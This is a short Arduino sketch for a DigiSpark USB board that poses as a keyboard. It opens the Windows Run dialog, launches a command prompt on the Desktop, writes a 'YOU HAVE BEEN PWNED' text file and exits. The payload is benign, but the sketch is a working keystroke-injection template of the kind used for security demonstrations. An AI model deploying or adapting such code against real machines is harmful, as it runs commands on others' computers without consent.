//This DigiSpark script creates a text file on desktop with pwned message
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("cmd /k cd %UserProfile%/Desktop");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("echo YOU HAVE BEEN PWNED > YOU_HAVE_BEEN_PWNED.TXT");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("exit");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 for (;;) {
 /*empty*/
}
}

    
